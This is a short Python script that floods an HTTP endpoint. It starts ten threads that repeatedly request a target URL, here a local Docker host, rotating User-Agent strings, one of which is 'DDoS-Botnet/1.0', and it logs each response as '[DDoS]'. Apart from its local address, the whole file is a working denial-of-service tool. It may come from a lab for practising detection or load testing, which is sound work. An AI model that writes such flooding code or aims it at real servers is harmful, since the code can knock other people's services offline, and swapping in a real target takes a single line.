import requests
import threading
import time
import random

TARGET = "http://host.docker.internal:8000"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 10)",
    "DDoS-Botnet/1.0"
]

def flood():
    while True:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(TARGET, headers=headers)
            print(f"[DDoS] Status: {response.status_code}")
            time.sleep(0.01)
        except Exception as e:
            print(f"[DDoS Error] {e}")
            time.sleep(0.1)

def attack():
    for _ in range(10):  # 10 потоков
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
    while True:
        time.sleep(1)

if __name__ == "__main__":
    attack()